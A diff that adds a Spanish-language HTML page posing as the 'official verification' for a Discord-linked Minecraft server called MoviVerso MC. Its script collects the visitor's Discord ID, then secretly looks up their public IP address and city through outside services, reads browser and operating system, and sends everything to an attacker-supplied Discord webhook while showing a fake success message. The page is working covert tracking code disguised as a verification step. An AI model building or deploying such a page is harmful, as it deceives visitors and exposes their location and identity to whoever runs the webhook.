@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MoviVerso MC | Verificación</title>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,600;0,700;1,400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Playfair Display', serif;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #1a0000, #2d0000, #000000);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px);
+            border-radius: 48px;
+            padding: 40px;
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid #ff3333;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+        }
+        .icon { font-size: 70px; color: #ff3333; margin-bottom: 20px; }
+        h1 { font-size: 32px; color: #ff4444; margin-bottom: 10px; }
+        .subtitle { color: rgba(255,200,200,0.7); margin-bottom: 30px; }
+        .form-group { margin-bottom: 20px; text-align: left; }
+        label { display: block; color: #ffaaaa; margin-bottom: 8px; }
+        input {
+            width: 100%;
+            padding: 14px;
+            background: rgba(0,0,0,0.6);
+            border: 1px solid #ff3333;
+            border-radius: 30px;
+            color: white;
+            font-size: 16px;
+        }
+        input:focus { outline: none; border-color: #ff6666; }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #cc0000, #4a0000);
+            border: none;
+            border-radius: 30px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover { background: linear-gradient(135deg, #ff0000, #660000); transform: scale(1.02); }
+        .result { margin-top: 20px; padding: 12px; border-radius: 20px; display: none; }
+        .result.success { background: rgba(0,255,0,0.2); color: #00ff00; display: block; }
+        .result.error { background: rgba(255,0,0,0.2); color: #ff8888; display: block; }
+        .result.loading { background: rgba(255,255,0,0.2); color: #ffff00; display: block; }
+        .footer { margin-top: 25px; font-size: 11px; color: rgba(255,150,150,0.5); }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon"><i class="fab fa-discord"></i></div>
+        <h1>MoviVerso MC</h1>
+        <p class="subtitle">Verifica tu cuenta para acceder al servidor</p>
+        
+        <div class="form-group">
+            <label><i class="fas fa-hashtag"></i> ID de Discord</label>
+            <input type="text" id="discordId" placeholder="Ej: 123456789012345678">
+            <small style="color:#aa6666; font-size:10px;">Activa Modo Desarrollador → clic derecho en tu perfil → Copiar ID</small>
+        </div>
+        
+        <div class="form-group">
+            <label><i class="fas fa-user"></i> Usuario (opcional)</label>
+            <input type="text" id="discordUser" placeholder="Ej: Juanito#1234">
+        </div>
+        
+        <button id="verifyBtn"><i class="fab fa-discord"></i> Verificar</button>
+        <div id="result" class="result"></div>
+        <div class="footer"><i class="fas fa-shield-alt"></i> Verificación oficial</div>
+    </div>
+
+    <script>
+        // 🔴 REEMPLAZA CON TU WEBHOOK URL 🔴
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/TU_ID_AQUI/TU_TOKEN_AQUI';
+        
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'Desconocido';
+            let os = 'Desconocido';
+            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Google Chrome';
+            else if (ua.includes('Firefox')) browser = 'Mozilla Firefox';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+            else if (ua.includes('Edg')) browser = 'Microsoft Edge';
+            if (ua.includes('Windows')) os = 'Windows';
+            else if (ua.includes('Mac')) os = 'MacOS';
+            else if (ua.includes('Linux')) os = 'Linux';
+            else if (ua.includes('Android')) os = 'Android';
+            else if (ua.includes('iOS')) os = 'iOS';
+            return { browser, os, ua };
+        }
+        
+        document.getElementById('verifyBtn').onclick = async () => {
+            const discordId = document.getElementById('discordId').value.trim();
+            const discordUser = document.getElementById('discordUser').value.trim() || 'No proporcionado';
+            const resultDiv = document.getElementById('result');
+            
+            if (!discordId) {
+                resultDiv.className = 'result error';
+                resultDiv.innerHTML = '❌ Por favor ingresa tu ID de Discord';
+                return;
+            }
+            
+            resultDiv.className = 'result loading';
+            resultDiv.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
+            
+            try {
+                const ipRes = await fetch('https://api.ipify.org');
+                const ip = await ipRes.text();
+                
+                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                const geo = await geoRes.json();
+                const location = geo.country_name ? `${geo.country_name}, ${geo.city || 'Ciudad desconocida'}` : 'No disponible';
+                
+                const browserInfo = getBrowserInfo();
+                
+                const embed = {
+                    content: "🔐 **NUEVA VERIFICACIÓN** 🔐",
+                    embeds: [{
+                        title: "📋 Datos del usuario",
+                        color: 0xcc0000,
+                        fields: [
+                            { name: "👤 Discord", value: `**ID:** ${discordId}\n**Usuario:** ${discordUser}`, inline: false },
+                            { name: "🌍 Ubicación", value: `${location}\n**IP:** ${ip}`, inline: true },
+                            { name: "💻 Dispositivo", value: `**Navegador:** ${browserInfo.browser}\n**SO:** ${browserInfo.os}`, inline: true },
+                            { name: "🕐 Hora", value: new Date().toLocaleString('es-ES'), inline: false }
+                        ],
+                        footer: { text: "MoviVerso MC" },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+                
+                await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(embed) });
+                
+                resultDiv.className = 'result success';
+                resultDiv.innerHTML = '✅ Verificación completada. ¡Revisa tu rol en Discord!';
+                document.getElementById('discordId').value = '';
+                
+            } catch (error) {
+                resultDiv.className = 'result error';
+                resultDiv.innerHTML = '❌ Error. Por favor intenta de nuevo.';
+            }
+        };
+    </script>
+</body>
+</html>
